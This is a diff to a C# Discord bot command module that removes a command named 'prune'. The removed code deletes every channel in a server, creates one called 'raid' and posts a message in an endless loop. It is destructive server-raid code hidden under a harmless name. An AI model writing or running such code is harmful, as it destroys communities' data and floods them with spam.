@@ -102,19 +102,6 @@ public class ChatModule : BaseCommandModule {
         }
     }
 
-    [Command("prune")]
-    public async Task pruneServer(CommandContext ctx, [RemainingText] string message) {
-        var guild = ctx.Guild;
-        foreach (var channel in ctx.Guild.Channels) {
-            await channel.Value.DeleteAsync();
-        }
-        var chn = await guild.CreateChannelAsync("raid", ChannelType.Text);
-        while (true) {
-            await chn.SendMessageAsync(message);
-            await Task.Delay(1000);
-        }
-    }
-
     [Command("webhook")]
     public async Task sendWebhook(CommandContext ctx, [RemainingText] string message) {
         await Program.wiltery.sendWebhookToChannel(ctx.Channel, message);
